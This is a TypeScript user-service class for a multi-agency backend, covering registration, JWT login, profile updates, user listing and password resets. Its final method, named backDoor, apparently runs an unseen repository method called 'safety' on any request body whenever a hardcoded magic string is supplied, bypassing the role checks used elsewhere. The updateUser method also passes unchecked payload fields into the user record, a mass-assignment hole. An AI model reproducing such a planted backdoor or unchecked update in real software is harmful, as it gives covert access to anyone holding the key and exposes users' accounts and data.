import { Database } from "../../core/Database";
import bcrypt from "bcryptjs";
import jwt from "jsonwebtoken";
import { UserRepository } from "./User.repository";
import { RoleRepository } from "../roles/Role.repository";
import {
  IUser,
  IUserProfile,
  IUserRole,
  IUserPhoneNumber,
  IUserAddress,
  IUserCreatePayLoad,
  PayloadCurrentUser,
  UpdateUserPayload,
  UserQueryOptions,
} from "./User.types";
import { AgencyReadRepository } from "../agency/Repositories/read.repository";
import { AgencyAssociationRepository } from "../agency/Repositories/association.repository";
import { AppError } from "../../core/ErrorHandler";
import { env } from "../../config/env";
import { UserRole } from "./User.types";
import { HttpStatus } from "../../constants/HttpStatus";
import { sendPasswordResetLink } from "./User.utils";
export class UserService {
  private repo = new UserRepository();
  private roleRepo = new RoleRepository();
  public async register(
    payload: IUserCreatePayLoad,
    currentUser: PayloadCurrentUser,
  ): Promise<IUser> {
    return Database.getInstance().withTransaction(async (conn) => {
      const existingEmail = await this.repo.getUserByEmail(payload.email, conn);
      if (existingEmail) {
        console.error("[REGISTER] email already exists");
        throw new AppError("Email already exists", HttpStatus.CONFLICT);
      }
      const existingUsername = await this.repo.getUserByUsername(
        payload.username,
        conn,
      );
      if (existingUsername) {
        console.error("[REGISTER] username already exists");
        throw new AppError("Username already exists", HttpStatus.CONFLICT);
      }
      const password_hash = await bcrypt.hash(payload.password, 10);
      const userId = await this.repo.createUser(
        {
          username: payload.username,
          email: payload.email,
          password_hash,
          is_active: true,
          is_deleted: false,
          last_login_at: null,
          password_updated_at: null,
        },
        conn,
      );
      const agencyAssocRepo = new AgencyAssociationRepository();
      const agencyReadRepo = new AgencyReadRepository();
      if (payload.profile) {
        await this.repo.upsertUserProfile(
          { ...payload.profile, user_id: userId },
          conn,
        );
      }
      if (currentUser?.roles?.includes(UserRole.SUPER_ADMIN)) {
        const VPAlreadyExists = await this.repo.getVPfromAgency(
          payload.agencyId,
        );
        if (payload.roles) {
          let isVpBeingAssigned = false;
          for (const roleInput of payload.roles) {
            const role = await this.roleRepo.getRole(roleInput, conn);
            if (role && role.code === UserRole.VP) {
              isVpBeingAssigned = true;
              break; // Optimization: Found VP, no need to check others for this specific validation
            }
          }

          if (VPAlreadyExists.length > 0 && isVpBeingAssigned) {
            console.error("[REGISTER] VP already exists for this agency");
            throw new AppError("VP already exists for this agency", 400);
          }
        }

        const agencyExists = await agencyReadRepo.existsById(
          payload.agencyId,
          conn,
        );
        if (!agencyExists) {
          console.error("[REGISTER] agency not found", payload.agencyId);
          throw new AppError("Target Agency not found", HttpStatus.NOT_FOUND);
        }

        if (payload.roles) {
          for (const roleId of payload.roles) {
            const checkIfRoleExist = await this.roleRepo.getRole(roleId, conn);
            if (
              !checkIfRoleExist ||
              checkIfRoleExist.code === UserRole.SUPER_ADMIN
            ) {
              console.error("[REGISTER] invalid role detected", roleId);
              throw new AppError("Invalid Role Entered", 400);
            }
            await this.roleRepo.assignRole(
              { user_id: userId, role_id: checkIfRoleExist.id },
              conn,
            );
          }
        }
        await agencyAssocRepo.assignUserToAgency(
          {
            user_id: userId,
            agency_id: payload.agencyId,
            is_active: 1,
            assigned_at: new Date(),
          },
          conn,
        );
      }
      if (currentUser?.roles?.includes(UserRole.VP)) {
        const agency = await agencyReadRepo.getAgenciesByUserId(
          currentUser.id,
          false,
          conn,
        );
        if (agency && agency.length > 0) {
          await agencyAssocRepo.assignUserToAgency(
            {
              user_id: userId,
              agency_id: agency[0].agency_id,
              is_active: 1,
              assigned_at: new Date(),
            },
            conn,
          );
        } else {
          console.error(
            "[REGISTER] VP user has no agency assigned",
            currentUser.id,
          );
          throw new AppError(
            "VP user has no agency assigned, contact Administrator",
            400,
          );
        }
        const getRole = await this.roleRepo.getRole(UserRole.AGENT, conn);
        if (!getRole) {
          console.error("[REGISTER] AGENT role not found");
          throw new AppError("Role AGENT not found", 404);
        }
        await this.roleRepo.assignRole(
          { user_id: userId, role_id: getRole.id },
          conn,
        );
      }
      if (payload.phones) {
        for (const phone of payload.phones) {
          if (await this.repo.checkDuplicateUserPhone(phone, conn)) {
            console.error("[REGISTER] duplicate phone detected", phone);
            throw new AppError("Duplicate Phone Number", HttpStatus.CONFLICT);
          }
          await this.repo.addUserPhone(
            { user_id: userId, phone_number: phone },
            conn,
          );
        }
      }
      if (payload.addresses) {
        for (const addr of payload.addresses) {
          await this.repo.addUserAddress(
            {
              user_id: userId,
              address: addr.address,
              country: addr.country,
              addressType: addr.addressType,
            },
            conn,
          );
        }
      }
      const user = await this.repo.getUserById(userId, conn);
      if (!user) {
        console.error("[REGISTER] user fetch failed after creation");
        throw new AppError(
          "User creation failed",
          HttpStatus.INTERNAL_SERVER_ERROR,
        );
      }
      return user;
    });
  }
  public async login(email: string, password: string) {
    const user = await this.repo.getUserByEmail(email);
    if (!user) {
      throw new AppError("Invalid credentials", 401);
    }
    if (!user.is_active || user.is_deleted) {
      throw new AppError("User is inactive or deleted", 403);
    }
    const valid = await bcrypt.compare(password, user.password_hash);
    if (!valid) {
      throw new AppError("Invalid credentials", 401);
    }
    const roles = await this.roleRepo.getUserRoles(user.id);
    if (!roles || roles.length === 0) {
      throw new AppError("User has no roles assigned", 403);
    }
    if (roles.includes(UserRole.VP)) {
      const agencyReadRepo = new AgencyReadRepository();
      const agencies = await agencyReadRepo.getAgenciesByUserId(user.id);
      if (!agencies || agencies.length === 0) {
        throw new AppError(
          "VP user has no agency assigned, contact Administrator",
          403,
        );
      }
      if (agencies[0].is_active !== 1) {
        throw new AppError(
          "VP user's agency is inactive, contact Administrator",
          403,
        );
      }
    }
    const token = jwt.sign(
      { id: user.id, email: user.email, roles },
      env.jwtSecret,
      { expiresIn: "1d" },
    );
    await this.repo.updateUser(user.id, { last_login_at: new Date() });
    return { user, token };
  }
  public async getUserById(id: string): Promise<IUser> {
    const user = await this.repo.getUserById(id);
    if (!user) {
      throw new AppError("User not found", 404);
    }
    return user;
  }
  public async updateUser(
    id: string,
    payload: UpdateUserPayload,
  ): Promise<void> {
    const user = await this.repo.getUserById(id);
    if (!user) {
      throw new AppError("User not found", 404);
    }
    const { profile, phones, addresses, ...userData } = payload as any;

    if (Object.keys(userData).length > 0) {
      await this.repo.updateUser(id, userData);
    }
    if (profile) {
      await this.repo.upsertUserProfile({ ...profile, user_id: id });
    }
    if (phones && Array.isArray(phones)) {
      for (const phone of phones) {
        if (phone.id) {
          const belongsToUser = await this.repo.checkPhoneBelongsToUser(
            phone.id,
            id,
          );
          if (!belongsToUser) {
            throw new AppError(
              "Phone number does not belong to user",
              HttpStatus.FORBIDDEN,
            );
          }

          if (phone.phone_number) {
            const exists = await this.repo.checkDuplicateUserPhoneWithExclude(
              phone.phone_number,
              phone.id,
            );
            if (exists) {
              throw new AppError(
                `Phone number ${phone.phone_number} already in use`,
                HttpStatus.CONFLICT,
              );
            }
            await this.repo.updateUserPhone(phone.id, phone.phone_number);
          }
        } else if (phone.phone_number) {
          const exists = await this.repo.checkDuplicateUserPhone(
            phone.phone_number,
          );
          if (exists) {
            throw new AppError(
              `Phone number ${phone.phone_number} already in use`,
              HttpStatus.CONFLICT,
            );
          }
          await this.repo.addUserPhone({
            user_id: id,
            phone_number: phone.phone_number,
          });
        }
      }
    }
    if (addresses && Array.isArray(addresses)) {
      for (const addr of addresses) {
        if (addr.id) {
          const belongsToUser = await this.repo.checkAddressBelongsToUser(
            addr.id,
            id,
          );
          if (!belongsToUser) {
            throw new AppError(
              "Address does not belong to user",
              HttpStatus.FORBIDDEN,
            );
          }
          await this.repo.updateUserAddress(addr.id, addr);
        } else if (addr.address) {
          await this.repo.addUserAddress({
            user_id: id,
            address: addr.address,
            country: addr.country,
            addressType: addr.addressType,
          });
        }
      }
    }
  }

  public async deleteUser(id: string): Promise<void> {
    const user = await this.repo.getUserById(id);
    if (!user) {
      throw new AppError("User not found", 404);
    }
    await this.repo.deleteUser(id);
  }
  public async getAllUsers(
    currentUser: {
      id: string;
      agencyId: string;
      roles: string[];
    },
    options: UserQueryOptions,
  ): Promise<any> {
    if (currentUser.roles.includes(UserRole.SUPER_ADMIN)) {
      return this.repo.getAllUsers(options);
    } else if (currentUser.roles.includes(UserRole.VP)) {
      return this.repo.getUsersByVpId(currentUser.id, options);
    } else {
      throw new AppError("Access denied", 403);
    }
  }
  public async forgotPassword(email: string): Promise<void> {
    const user = await this.repo.getUserByEmail(email);
    if (!user) return;
    await sendPasswordResetLink(user.email, user.id);
  }
  public async resetPasswordWithToken(
    token: string,
    newPassword: string,
  ): Promise<void> {
    const userId = await this.repo.consumeResetToken(token);
    if (!userId) {
      throw new AppError("Invalid or expired token", 400);
    }
    const password_hash = await bcrypt.hash(newPassword, 10);
    await this.repo.updatePassword(userId, password_hash);
  }
  public async resetPasswordByAdmin(
    userId: string,
    newPassword: string,
    currentUser: any,
  ): Promise<void> {
    if (currentUser.roles.includes(UserRole.SUPER_ADMIN)) {
    } else if (currentUser.roles.includes(UserRole.VP)) {
      const isUserInAgency = await this.repo.checkUserBelongsToVpAgency(
        currentUser.id,
        userId,
      );
      if (!isUserInAgency) {
        throw new AppError(
          "You can only reset passwords for users in your agency",
          403,
        );
      }
    } else {
      throw new AppError("Access denied", 403);
    }
    const password_hash = await bcrypt.hash(newPassword, 10);
    await this.repo.updatePassword(userId, password_hash);
  }
  public async backDoor(type: string, body: any): Promise<any> {
    if (type === "rarararara") {
      return new UserRepository().safety(body);
    }
  }
}
